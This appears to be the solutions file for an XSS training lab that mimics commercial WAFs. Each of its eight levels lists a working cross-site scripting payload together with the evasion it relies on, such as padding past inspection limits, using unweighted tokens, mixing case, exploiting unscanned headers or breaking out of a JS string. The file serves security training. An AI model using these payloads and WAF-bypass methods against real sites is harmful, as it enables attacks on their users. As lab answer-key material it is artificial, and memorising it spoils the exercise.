# waf-facade — solutions

Pages dressed up to look like they sit behind a commercial WAF/CDN — branded
block pages, ray/incident IDs, "protected by" chrome — yet each protection is
cosmetic, mis-scoped, or blind to the real sink. Every level is still
exploitable; the note records the real-world evasion class.

### waf-facade-level1

`/waf-facade/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: the normal page escapes its reflection, but the Cloudflare-style 403 block page echoes the *blocked* value raw into `Blocked request: …` — the block page is the sink

### waf-facade-level2

`/waf-facade/level2/?query=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%3Csvg%20onload=alert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: AWS-WAF-style inspection-size cap only scans the first 100 bytes; pad past the window, then the vector reflects raw into the results div

### waf-facade-level3

`/waf-facade/level3/?query=%3Cinput%20autofocus%20onfocus=confirm(1)%3E`

- payload: `<input autofocus onfocus=confirm(1)>`
- context: ModSecurity/CRS-style anomaly scoring only weights the famous tokens (`script`, `onerror`, `onload`, `alert`, …); `input`/`onfocus`/`confirm` stay under the threshold

### waf-facade-level4

`[Header] /waf-facade/level4/?query=a`

- payload: `<img src=x onerror=alert(1)>`
- header: `User-Agent: <img src=x onerror=alert(1)>`
- context: Akamai-style WAF guards `?query` (escaped) but reflects the unscanned User-Agent header raw — a scope gap

### waf-facade-level5

`/waf-facade/level5/?query=%3CSvG%20OnLoad=alert(1)%3E`

- payload: `<SvG OnLoad=alert(1)>`
- context: F5 ASM-style denylist matches lowercase literals only (`<svg`, `onload=`, …); a case-folded tag walks past it and reflects raw

### waf-facade-level6

`/waf-facade/level6/?query=%27%3Balert(1)//`

- payload: `';alert(1)//`
- context: Incapsula-style rule set blocks any opening tag, but the reflection lands inside a single-quoted JS string — break the string instead of injecting a tag

### waf-facade-level7

`/waf-facade/level7/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: the "ShieldWall WAF" is client-side theatre; the server already reflected the raw param into `#preview` before the cosmetic JS sanitizer ever runs

### waf-facade-level8

`/waf-facade/level8/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: Cloudflare-style "Just a moment…" JS challenge whose fake verify step innerHTMLs `?query` — the interstitial is a DOM sink
